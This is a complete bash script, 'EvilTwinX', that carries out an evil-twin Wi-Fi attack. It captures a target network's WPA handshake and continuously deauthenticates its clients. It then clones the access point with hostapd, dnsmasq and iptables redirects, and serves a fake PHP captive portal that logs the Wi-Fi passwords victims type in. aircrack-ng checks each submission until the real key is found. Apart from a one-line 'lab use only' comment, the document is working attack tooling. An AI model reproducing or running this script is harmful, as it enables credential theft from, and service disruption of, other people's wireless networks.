#!/bin/bash
# EvilTwinX: Evil Twin Wi-Fi POC with live portal request monitoring
# ⚠ Lab use only (your own Wi-Fi + devices)

GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

BASE_DIR=$(pwd)

# 🖥️ ASCII Logo
clear
echo -e "${RED}"
echo "███████╗██╗  ██╗██╗██╗  ████████╗██╗    ██╗██╗███╗  ██╗██╗   ██╗"
echo "██╔════╝██║  ██║██║██║  ╚══██╔══╝██║    ██║██║████╗ ██║╚██╗ ██╔╝"
echo "███████╗██║  ██║██║██║     ██║   ██║ █╗ ██║██║██╔██╗██║  ╚██╔═╝ "
echo "██╔════╝██║  ██║██║██║     ██║   ██║███╗██║██║██║╚████║ ██╔═██╗ "
echo "███████║╚█████╔╝██║███████╗██║   ╚███╔███╔╝██║██║ ╚███║██╔╝ ╚██╗"
echo "╚══════╝ ╚════╝ ╚═╝╚══════╝╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚══╝╚═╝   ╚═╝"
echo -e "${GREEN}                      Evil Twin Attack Tool${RESET}"
echo ""

# Ensure base folders exist
mkdir -p "$BASE_DIR/handshakes"
mkdir -p "$BASE_DIR/portal"
mkdir -p "$BASE_DIR/logs"
mkdir -p "$BASE_DIR/captured_passwords"

# Reset capture files for new run
> "$BASE_DIR/portal/captured.txt"
> "$BASE_DIR/portal/requests.log"
> "$BASE_DIR/portal/attempts.log"

echo -e "${GREEN}[+] Starting EvilTwinX...${RESET}"

# Step 1: Enable monitor mode on wlan0
airmon-ng start wlan0 > /dev/null

# Step 2: Scan for networks
echo -e "${GREEN}[+] Scanning Wi-Fi networks... (Ctrl+C when target visible)${RESET}"
airodump-ng wlan0mon
echo -ne "${GREEN}[?] Enter target BSSID: ${RESET}"
read BSSID

echo -ne "${GREEN}[?] Enter target channel: ${RESET}"
read CHANNEL

echo -ne "${GREEN}[?] Enter target SSID: ${RESET}"
read SSID

# Step 3: Prepare handshake directory
HS_DIR="$BASE_DIR/handshakes/$SSID"
mkdir -p "$HS_DIR"

# Step 4: Capture handshake (Top-Left)
gnome-terminal --geometry=80x24+0+0 --title="Handshake Capture" -- bash -c "airodump-ng -c $CHANNEL --bssid $BSSID -w $HS_DIR/$SSID wlan0mon" &
sleep 3

# Step 5: Deauth Attack (Bottom-Left)
gnome-terminal --geometry=80x24+0-0 --title="Deauth Attack" -- bash -c "aireplay-ng -0 10 -a $BSSID wlan0mon" &
echo -e "${GREEN}[+] Handshake will be saved in $HS_DIR/${SSID}-01.cap${RESET}"

# Step 6: Setup Evil Twin AP (Top-Right)
cat > hostapd.conf <<EOF
interface=wlan1
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
EOF

gnome-terminal --geometry=80x24-0+0 --title="Evil Twin AP" -- bash -c "hostapd hostapd.conf" &

# Step 7: Configure wlan1 & dnsmasq (Bottom-Right)
ip addr add 192.168.5.1/24 dev wlan1
ip link set wlan1 up

cat > dnsmasq.conf <<EOF
interface=wlan1
dhcp-range=192.168.5.2,192.168.5.100,12h
dhcp-option=3,192.168.5.1
dhcp-option=6,192.168.5.1
address=/#/192.168.5.1
address=/captive.gateway.lan/192.168.5.1
EOF

gnome-terminal --geometry=80x24-0-0 --title="DNS/DHCP" -- bash -c "dnsmasq -C dnsmasq.conf -d" &

# Step 8: Captive portal (Middle-Top)
chmod -R 755 "$BASE_DIR/portal"

cat > "$BASE_DIR/portal/index.php" <<EOF
<?php
\$log_file = __DIR__ . '/requests.log';
\$attempt_file = __DIR__ . '/attempts.log';
\$captured_file = __DIR__ . '/captured.txt';

\$entry = "[" . date('Y-m-d H:i:s') . "] " . \$_SERVER['REMOTE_ADDR'] . " requested " . \$_SERVER['REQUEST_URI'] . "\\n";
file_put_contents(\$log_file, \$entry, FILE_APPEND);

if (isset(\$_POST['password'])) {
    \$pass_entry = \$_POST['password'] . "\\n";
    file_put_contents(\$captured_file, \$pass_entry, FILE_APPEND);
    file_put_contents(\$attempt_file, "[Attempt] " . date('Y-m-d H:i:s') . " - " . \$_POST['password'] . "\\n", FILE_APPEND);
}

echo "<html><body><h2>Wi-Fi Login Portal</h2><form method='POST'>
<input type='password' name='password' placeholder='Wi-Fi Password' required>
<button type='submit'>Submit</button>
</form></body></html>";
EOF

gnome-terminal --geometry=80x24+600+0 --title="Captive Portal" -- bash -c "cd $BASE_DIR/portal && php -S 192.168.5.1:80" &

# Step 9: Portal Log Monitor (Middle-Bottom)
gnome-terminal --geometry=80x24+600-0 --title="Portal Log Monitor" -- bash -c "tail -f $BASE_DIR/portal/requests.log $BASE_DIR/portal/attempts.log" &

echo -e "${GREEN}[+] Portal available at http://192.168.5.1 or http://captive.gateway.lan${RESET}"

# Step 10: iptables rules
echo -e "${GREEN}[+] Applying iptables redirect rules...${RESET}"
iptables -t nat -F
iptables -F
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 192.168.5.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

# Step 11: Continuous deauth (Background)
gnome-terminal --geometry=80x24+0-0 --title="Continuous Deauth" -- bash -c "aireplay-ng -0 0 -a $BSSID wlan0mon" &

# Step 12: Password verification loop
echo -e "${GREEN}[+] Waiting for victim password submission...${RESET}"
while true; do
  if [ -s "$BASE_DIR/portal/captured.txt" ]; then
    echo -e "${GREEN}[+] Password attempt captured! Verifying...${RESET}"

    RESULT=$(aircrack-ng "$HS_DIR/${SSID}-01.cap" -w "$BASE_DIR/portal/captured.txt" 2>/dev/null)

    if echo "$RESULT" | grep -q "KEY FOUND"; then
      echo -e "${GREEN}[✔] Correct password found! Attack successful.${RESET}"

      PASSFILE="$BASE_DIR/captured_passwords/${SSID}.txt"
      cp "$BASE_DIR/portal/captured.txt" "$PASSFILE"
      echo -e "${GREEN}[+] Saved correct password to $PASSFILE${RESET}"

      # ✅ Reliable cleanup
      pkill hostapd
      pkill dnsmasq
      pkill aireplay-ng
      pkill airodump-ng
      pkill php
      pkill tail
      pkill gnome-terminal

      iptables -F
      iptables -t nat -F
      airmon-ng stop wlan0mon > /dev/null 2>&1
      ip link set wlan1 down

      rm -f "$BASE_DIR/hostapd.conf" "$BASE_DIR/dnsmasq.conf"
      > "$BASE_DIR/portal/captured.txt"

      echo -e "${GREEN}[+] Cleaned up all processes. Attack finished.${RESET}"
      break
    else
      echo -e "${RED}[✘] Wrong password attempt. Waiting for another...${RESET}"
      > "$BASE_DIR/portal/captured.txt"
    fi
  fi
  sleep 5
done

echo -e "${GREEN}[+] EvilTwinX finished.${RESET}"
